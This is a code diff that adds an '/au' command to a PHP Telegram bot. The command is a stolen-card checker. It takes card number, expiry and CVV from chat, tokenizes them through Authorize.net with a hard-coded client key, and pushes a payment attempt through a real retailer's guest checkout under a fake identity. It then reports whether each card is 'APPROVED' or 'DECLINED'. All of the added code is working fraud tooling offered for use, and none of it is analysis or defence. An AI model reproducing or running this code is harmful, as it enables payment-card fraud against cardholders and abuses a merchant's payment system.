@@ -2960,6 +2960,149 @@ ob_flush();
 
 }
 
+elseif((strpos($message, "!au") === 0)||(strpos($message, "/au") === 0)||(strpos($message, ".au") === 0)){
+$lista = substr($message, 4);
+
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+$bin = substr($lista, 0, 6);
+$date = "$mes$ano";
+
+$bin = substr($lista, 0, 6);
+$verify = substr($cc, 16, 1);
+        if($verify != ""){
+                $respuesta = "🚫 Oops!\nUse this format: /au CC|MM|YYYY|CVV\n";
+                sendMessage($chat_id,$respuesta, $message_id);
+		die();
+}
+
+if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+                                                                     
+}else{
+        $respuesta = "🚫 Oops!\nUse this format: /au CC|MM|YYYY|CVV\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
+}
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api2.authorize.net/xml/v1/request.api',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"securePaymentContainerRequest":{"merchantAuthentication":{"name":"8JHG4sz2K","clientKey":"8df5becJ36r8cCupJe5c4Gpp7B7gKUEK4Z558rV88MSzMqpJ2B8q8AGr2hVEqx6u"},"clientId":"accept-ui-v3","data":{"type":"TOKEN","id":"56969a1d-3044-e77c-f0f8-5d5f9ef44e5d","token":{"cardNumber":"'.$cc.'","expirationDate":"'.$date.'","cardCode":"'.$cvv.'"}}}}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'Content-Type: application/json; charset=UTF-8',
+    'sec-ch-ua-mobile: ?1',
+    'Sec-GPC: 1',
+    'Accept-Language: es-US,es;q=0.6',
+    'Origin: https://js.authorize.net',
+    'Sec-Fetch-Site: same-site',
+    'Sec-Fetch-Mode: cors',
+    'Sec-Fetch-Dest: empty',
+    'Referer: https://js.authorize.net/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+preg_match('/"dataValue":"([^"]+)"/', $response, $match);
+$id = $match[1];
+curl_close($curl);
+
+
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://m2.crane.com/rest/V1/guest-carts/eUlwOllHIXA3xZpxbpL5zHHm6z9LD2iw/payment-information',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"email":"Dausitherer@cuvox.de","cartId":"eUlwOllHIXA3xZpxbpL5zHHm6z9LD2iw","billingAddress":{"region_id":"4","country_id":"US","street":["6195 bollinger rd"],"postcode":"10010","city":"New york","telephone":"(417) 920-4022","firstname":"Carlos","lastname":"Perez"},"paymentMethod":{"method":"authnetcim","additional_data":{"acceptjs_key":"COMMON.ACCEPT.INAPP.PAYMENT","acceptjs_value":"'.$id.'"}},"comments":""}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+    'Accept-Encoding: gzip, deflate, br, zstd',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    'sec-ch-ua-mobile: ?1',
+    'sec-gpc: 1',
+    'accept-language: es-US,es;q=0.6',
+    'origin: https://www.crane.com',
+    'sec-fetch-site: same-site',
+    'sec-fetch-mode: cors',
+    'sec-fetch-dest: empty',
+    'referer: https://www.crane.com/',
+    'priority: u=1, i',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$respo = $json["message"];
+curl_close($curl);
+
+echo "$respo\n";
+
+$if(empty($respo)){
+$respo = $response;
+}
+
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'This transaction has been declined.') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+}
+
+
 
 elseif((strpos($message, "!ta") === 0)||(strpos($message, "/ta") === 0)||(strpos($message, ".ta") === 0)){
 
